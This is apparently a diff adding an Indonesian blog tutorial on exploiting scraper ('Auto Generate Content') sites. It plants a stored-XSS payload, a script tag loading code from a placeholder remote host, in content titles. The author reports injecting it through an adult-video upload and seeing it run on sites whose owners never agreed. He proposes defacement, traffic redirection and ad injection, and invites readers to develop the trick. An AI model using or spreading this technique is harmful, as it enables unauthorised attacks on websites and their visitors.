@@ -1,0 +1,35 @@
+I"�<p><img src="/images/web_scrapper.png" alt="AGC" /></p>
+
+<p><strong>DISCLAIMER</strong>
+Semua yang ditulis pada artikel ini adalah untuk pengetahuan semata. Penyalahgunaan metode yang ada pada artikel ini bukan merupakan tanggungjawab penulis.</p>
+
+<p><strong>ABSTRAKSI</strong></p>
+
+<p>Kemajuan teknologi membuat banyak orang ikut saling berbagi informasi di dunia maya. Salah satu yang dapat dilakukan adalah dengan melakukan Blogging. Mereka dapat berbagi cerita, pengalaman, dan informasi menarik lainnya. Selain berupa tulisan, media lain seperti foto dan video pun dapat menjadi konten untuk dibagikan pada banyak orang.</p>
+
+<p>Namun sayangnya, tidak semua orang ingin ‘bersusah-payah’ menulis Blog secara manual. Ada sekelompok orang di luar sana yang lebih memilih melakukan copy paste tulisan orang lain untuk dimasukkan kedalam Blog mereka. Ada pula kelompok lain yang melakukan hal tersebut secara otomatis, Blog mereka dengan sendirinya mengisi dan mengumpulkan konten-konten tanpa harus ditulis secara manual, Blog semacam ini biasa disebut Auto Generate Content (AGC).</p>
+
+<p>Situs Auto Generate Content (AGC) biasanya memanfaatkan feed dari sebuah situs untuk dilakukan scrapping data dan dimasukan kedalam situs mereka. Banyak sekali penyedia atau penjual script AGC, dari yang simpel hingga kompleks. Namun tidak semua penyedia atau penjual script AGC memperhatikan sisi security dari script yang mereka jual. Ada beberapa script AGC yang dari fitur scrapping-nya tersebut dapat menjadi celah untuk di-exploitasi.</p>
+
+<p><strong>MEREKA MENGAMBIL APA YANG KITA TULIS</strong></p>
+
+<p>Kebanyakan situs AGC benar-benar mengambil apa yang kita tulis, tanpa merubahnya sedikit pun. Darisini lah terdapat celah yang dapat dimanfaatkan untuk melakukan exploitasi.</p>
+
+<p>Bayangkan bila anda memiliki tulisan Blog dengan judul: “Tutorial Pemrograman PHP ‘&gt;&lt;script src=//xxx&gt;&lt;/script&gt;”, maka situs AGC akan mengambil tulisan anda dengan judul yang sama. Bila pada script AGC tersebut tidak dilakukan filter XSS, maka dapat dipastikan script tersebut akan di-render oleh website AGC tersebut.</p>
+
+<p><strong>PROOF OF CONCEPT</strong></p>
+
+<p>Sebagai contoh, saya akan meng-upload video pada sebuah situs dewasa yang sering di-scrapping oleh situs AGC. Pada Judul video, kita sisipkan payload XSS.</p>
+
+<p><img src="/images/xvd_sample.png" alt="XVideos" /></p>
+
+<p>Setelah meng-upload video dengan payload XSS, tidak lama saya mendapat notification bahwa ada situ AGC yang men-scrap video tersebut, dan benar saja script XSS nya bekerja.</p>
+
+<p><img src="/images/xssht_sample.png" alt="XSSHt" /></p>
+
+<p>Contoh di atas menunjukan bahwa masih banyak situs AGC di-luar sana yang tidak memiliki filter ketika melakukan scrapping, sehingga berpotensi menjadi celah keamanan yang dapat di-ekploitasi. Setelah memastikan bahwa situs AGC tersebut valid memiliki kerentanan, tinggal bagaimana kita memanfaatkan kerentanan tersebut. Banyak yang dapat kita lakukan, mulai dari <em>Defacing</em>, melakukan <em>Redirect</em> ke website kita untuk mendapat visitor, bahkan menyisipkan <em>Kode Iklan</em> pada situs tersebut.</p>
+
+<p><img src="/images/ppl_sample.png" alt="Paypal" /></p>
+
+<p>Demikian artikel ini ditulis, silahkan lakukan eksperimen dan kembangkan trik ini :)</p>
+:ET
